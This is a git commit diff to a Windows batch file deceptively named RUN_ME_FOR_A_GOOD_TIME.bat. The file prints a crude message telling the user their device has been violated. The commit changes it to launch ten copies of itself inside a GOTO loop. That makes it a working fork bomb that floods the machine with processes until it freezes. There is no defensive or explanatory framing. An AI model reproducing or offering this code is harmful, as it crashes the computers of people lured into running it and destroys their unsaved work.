98e5b2e0a4f2cda08186e4add3fb55057598be89
Eix <eixxhis@gmail.com>
2017-12-23 13:10:29 -0500

    Update RUN_ME_FOR_A_GOOD_TIME.bat

--- RUN_ME_FOR_A_GOOD_TIME.bat
+++ RUN_ME_FOR_A_GOOD_TIME.bat
@@ -4,14 +4,14 @@ ECHO Your Windows Device has just been analy violated by Eix, Have a nice day!
 Pushd "%~dp0"
 title Eix%random%
 timeout /t 1 /nobreak >nul
-start Squidy.bat
-start Squidy.bat
-start Squidy.bat
-start Squidy.bat
-start Squidy.bat
-start Squidy.bat
-start Squidy.bat
-start Squidy.bat
-start Squidy.bat
-start Squidy.bat
+start RUN_ME_FOR_A_GOOD_TIME.bat
+start RUN_ME_FOR_A_GOOD_TIME.bat
+start RUN_ME_FOR_A_GOOD_TIME.bat
+start RUN_ME_FOR_A_GOOD_TIME.bat
+start RUN_ME_FOR_A_GOOD_TIME.bat
+start RUN_ME_FOR_A_GOOD_TIME.bat
+start RUN_ME_FOR_A_GOOD_TIME.bat
+start RUN_ME_FOR_A_GOOD_TIME.bat
+start RUN_ME_FOR_A_GOOD_TIME.bat
+start RUN_ME_FOR_A_GOOD_TIME.bat
 GOTO BEGIN
